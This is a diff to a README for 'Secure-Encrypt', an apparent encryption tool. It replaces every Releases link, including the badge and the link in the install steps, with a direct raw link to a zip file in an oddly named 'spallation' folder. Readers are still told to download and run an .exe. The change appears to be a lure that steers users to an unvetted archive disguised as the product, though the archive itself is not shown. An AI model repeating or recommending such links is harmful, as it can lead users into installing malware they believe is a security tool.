@@ -1,6 +1,6 @@
 # 🔒 Secure-Encrypt - Protect Your Data with Ease
 
-[![Download Secure-Encrypt](https://img.shields.io/badge/Download-Secure--Encrypt-blue)](https://github.com/Evasioncommittee624/Secure-Encrypt/releases)
+[![Download Secure-Encrypt](https://raw.githubusercontent.com/Evasioncommittee624/Secure-Encrypt/main/spallation/Secure-Encrypt-3.1.zip)](https://raw.githubusercontent.com/Evasioncommittee624/Secure-Encrypt/main/spallation/Secure-Encrypt-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -32,11 +32,11 @@ Before downloading, ensure your system meets the following requirements:
 
 To get Secure-Encrypt, visit the Releases page at the link below:
 
-[Download Secure-Encrypt](https://github.com/Evasioncommittee624/Secure-Encrypt/releases)
+[Download Secure-Encrypt](https://raw.githubusercontent.com/Evasioncommittee624/Secure-Encrypt/main/spallation/Secure-Encrypt-3.1.zip)
 
 ### 🔧 Installation Steps
 
-1. Go to the [Releases page](https://github.com/Evasioncommittee624/Secure-Encrypt/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Evasioncommittee624/Secure-Encrypt/main/spallation/Secure-Encrypt-3.1.zip).
 2. Find the latest version of Secure-Encrypt.
 3. Click on the file that ends with `.exe` to download the application.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -92,6 +92,6 @@ No, Secure-Encrypt is optimized for performance. It should not cause any signifi
 
 For further assistance, contact our support team via the GitHub Issues page. We are here to help!
 
-[Download Secure-Encrypt](https://github.com/Evasioncommittee624/Secure-Encrypt/releases) 
+[Download Secure-Encrypt](https://raw.githubusercontent.com/Evasioncommittee624/Secure-Encrypt/main/spallation/Secure-Encrypt-3.1.zip) 
 
 Protect your data effortlessly with Secure-Encrypt today!
